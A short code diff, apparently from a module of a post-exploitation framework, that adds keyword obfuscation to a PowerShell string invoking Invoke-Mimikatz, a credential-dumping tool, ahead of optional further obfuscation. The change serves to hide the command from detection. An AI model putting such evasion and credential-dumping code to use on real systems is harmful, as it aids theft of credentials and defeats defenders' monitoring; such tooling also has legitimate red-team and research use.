@@ -96,6 +96,7 @@ class Module(object):
 
         # base64 encode the command to pass to Invoke-Mimikatz
         scriptEnd = "Invoke-Mimikatz -Command '\"" + command + "\"';"
+        scriptEnd = helpers.keyword_obfuscation(scriptEnd, self.mainMenu)
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
